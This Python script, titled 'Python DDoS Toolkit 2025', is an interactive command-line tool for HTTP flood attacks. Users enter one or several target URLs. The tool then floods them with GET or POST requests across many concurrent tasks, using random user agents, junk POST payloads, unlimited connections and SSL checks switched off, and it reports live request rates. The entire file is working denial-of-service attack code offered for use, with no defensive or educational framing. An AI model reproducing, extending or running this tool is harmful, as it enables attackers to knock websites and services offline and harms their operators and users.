#!/usr/bin/env python3
import asyncio
import aiohttp
import threading
import time
import random
import sys
import os
from datetime import datetime
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init()

class DDoSToolkit:
    def __init__(self):
        self.session_count = 0
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        self.start_time = None
        self.running = False
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        self.clear_screen()
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                🚀 PYTHON DDoS TOOLKIT 2025                ║")
        print(f"║                  ⚡ ADVANCED CYBER FRAMEWORK                ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    def show_menu(self):
        print(f"\n{Fore.YELLOW}📋 ATTACK METHODS:{Style.RESET_ALL}")
        print("─" * 60)
        print("   1️⃣  🎯 HTTP Flood (GET)")
        print("   2️⃣  🌐 HTTP Flood (POST)")
        print("   3️⃣  🔄 Multi-Target Attack")
        print("   4️⃣  📊 Attack Statistics")
        print("   5️⃣  ⚙️  Settings")
        print("   6️⃣  ❌ Exit")
        
        choice = input(f"\n{Fore.GREEN}⚡ Choose your option [1-6]: {Style.RESET_ALL}")
        return choice
    
    async def http_flood(self, target, method='GET', duration=60, threads=100):
        """HTTP Flood attack"""
        self.running = True
        self.start_time = time.time()
        
        # User agents
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
        ]
        
        # Headers
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        async def send_request(session, url):
            while self.running and (time.time() - self.start_time) < duration:
                try:
                    headers['User-Agent'] = random.choice(user_agents)
                    
                    if method == 'GET':
                        async with session.get(url, headers=headers, timeout=10) as response:
                            if response.status == 200:
                                self.success_count += 1
                            else:
                                self.error_count += 1
                    else:  # POST
                        data = 'data=' + 'A' * random.randint(100, 1000)
                        async with session.post(url, data=data, headers=headers, timeout=10) as response:
                            if response.status == 200:
                                self.success_count += 1
                            else:
                                self.error_count += 1
                    
                    self.request_count += 1
                    
                except Exception:
                    self.error_count += 1
                
                await asyncio.sleep(0.01)  # Small delay
        
        # Create connector with custom settings
        connector = aiohttp.TCPConnector(
            limit=0,  # No connection limit
            limit_per_host=0,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=False  # Skip SSL verification for speed
        )
        
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for _ in range(threads):
                task = asyncio.create_task(send_request(session, target))
                tasks.append(task)
            
            # Monitor progress
            async def monitor():
                while self.running:
                    await asyncio.sleep(1)
                    elapsed = time.time() - self.start_time
                    rps = self.request_count / elapsed if elapsed > 0 else 0
                    print(f"\r🚀 Requests: {self.request_count:,} | ✅ Success: {self.success_count:,} | ❌ Errors: {self.error_count:,} | ⚡ RPS: {rps:.1f}", end='', flush=True)
            
            monitor_task = asyncio.create_task(monitor())
            
            try:
                await asyncio.gather(*tasks)
            except KeyboardInterrupt:
                pass
            finally:
                self.running = False
                monitor_task.cancel()
                print(f"\n\n{Fore.GREEN}✅ Attack completed!{Style.RESET_ALL}")
    
    async def single_target_attack(self):
        """Single target attack"""
        print(f"\n{Fore.CYAN}🎯 SINGLE TARGET ATTACK{Style.RESET_ALL}")
        
        target = input("🎯 Enter target URL (e.g., http://example.com): ")
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        method = input("⚡ Method [GET/POST] [GET]: ").upper() or 'GET'
        duration = int(input("⏱️  Duration in seconds [60]: ") or "60")
        threads = int(input("🧵 Threads [100]: ") or "100")
        
        print(f"\n{Fore.YELLOW}🚀 Starting {method} flood on {target}{Style.RESET_ALL}")
        print(f"📊 Duration: {duration}s | Threads: {threads}")
        print("Press Ctrl+C to stop...\n")
        
        try:
            await self.http_flood(target, method, duration, threads)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}❌ Attack stopped by user{Style.RESET_ALL}")
        
        input(f"\n{Fore.GREEN}Press ENTER to return to menu...{Style.RESET_ALL}")
    
    async def multi_target_attack(self):
        """Multi-target attack"""
        print(f"\n{Fore.CYAN}🌐 MULTI-TARGET ATTACK{Style.RESET_ALL}")
        
        print("📋 Enter targets (one per line, empty line to finish):")
        targets = []
        
        while True:
            target = input(f"Target {len(targets) + 1}: ")
            if not target:
                break
            
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            targets.append(target)
        
        if not targets:
            print(f"{Fore.RED}❌ No targets specified!{Style.RESET_ALL}")
            input("Press ENTER to return...")
            return
        
        method = input("⚡ Method [GET/POST] [GET]: ").upper() or 'GET'
        duration = int(input("⏱️  Duration in seconds [60]: ") or "60")
        threads_per_target = int(input("🧵 Threads per target [50]: ") or "50")
        
        print(f"\n{Fore.YELLOW}🚀 Starting {method} flood on {len(targets)} targets{Style.RESET_ALL}")
        print(f"📊 Duration: {duration}s | Total Threads: {len(targets) * threads_per_target}")
        print("Press Ctrl+C to stop...\n")
        
        try:
            tasks = []
            for target in targets:
                task = asyncio.create_task(self.http_flood(target, method, duration, threads_per_target))
                tasks.append(task)
            
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}❌ Attack stopped by user{Style.RESET_ALL}")
        
        input(f"\n{Fore.GREEN}Press ENTER to return to menu...{Style.RESET_ALL}")
    
    def show_statistics(self):
        """Show attack statistics"""
        self.clear_screen()
        print(f"{Fore.YELLOW}📊 ATTACK STATISTICS{Style.RESET_ALL}")
        
        if self.start_time:
            elapsed = time.time() - self.start_time
            rps = self.request_count / elapsed if elapsed > 0 else 0
            success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
            
            print(f"\n📈 Session Statistics:")
            print("─" * 50)
            print(f"⏱️  Duration: {elapsed:.1f} seconds")
            print(f"🚀 Total Requests: {self.request_count:,}")
            print(f"✅ Successful: {self.success_count:,}")
            print(f"❌ Failed: {self.error_count:,}")
            print(f"📊 Success Rate: {success_rate:.2f}%")
            print(f"⚡ Requests/Second: {rps:.1f}")
        else:
            print(f"\n{Fore.RED}❌ No attack statistics available{Style.RESET_ALL}")
        
        input(f"\n{Fore.GREEN}Press ENTER to return to menu...{Style.RESET_ALL}")
    
    def show_settings(self):
        """Show settings"""
        self.clear_screen()
        print(f"{Fore.MAGENTA}⚙️ SETTINGS{Style.RESET_ALL}")
        
        print(f"\n🔧 Current Configuration:")
        print("─" * 50)
        print(f"🌐 Default Method: GET")
        print(f"⏱️  Default Duration: 60 seconds")
        print(f"🧵 Default Threads: 100")
        print(f"🔧 SSL Verification: Disabled")
        print(f"🎭 Random User-Agents: Enabled")
        print(f"📊 Real-time Statistics: Enabled")
        
        print(f"\n{Fore.GREEN}✅ Settings optimized for Termux{Style.RESET_ALL}")
        
        input(f"\n{Fore.GREEN}Press ENTER to return to menu...{Style.RESET_ALL}")
    
    async def run(self):
        """Main program loop"""
        while True:
            self.show_banner()
            choice = self.show_menu()
            
            if choice == "1":
                await self.single_target_attack()
            elif choice == "2":
                await self.single_target_attack()  # Will be modified for POST
            elif choice == "3":
                await self.multi_target_attack()
            elif choice == "4":
                self.show_statistics()
            elif choice == "5":
                self.show_settings()
            elif choice == "6":
                print(f"\n{Fore.YELLOW}👋 Shutting down...{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}❌ Invalid option! Please choose 1-6{Style.RESET_ALL}")
                await asyncio.sleep(2)

async def main():
    toolkit = DDoSToolkit()
    await toolkit.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 Goodbye!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")